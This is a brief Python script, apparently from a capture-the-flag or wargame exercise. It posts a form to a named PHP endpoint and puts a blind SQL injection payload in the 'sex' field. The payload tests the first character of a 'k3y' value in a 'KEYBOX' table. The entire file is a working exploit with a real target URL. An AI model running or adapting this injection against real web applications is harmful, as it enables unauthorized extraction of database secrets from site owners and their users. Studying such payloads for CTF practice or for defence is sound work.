import requests
import re

url = "http://keeplink.kr:10105/web_basic_edit_ok.php" # POST

string = "(select if(ascii(substring((select k3y from KEYBOX limit 1),1,1))=0x42,2,1))"
data = {
        "id"    : "hello",
        "pw"    : "hello",
        "pwch"  : "hello",
        "age"   : "20",
        "sex"   : string,
        "email" : "hello",
        }
res = requests.post(url, data=data)
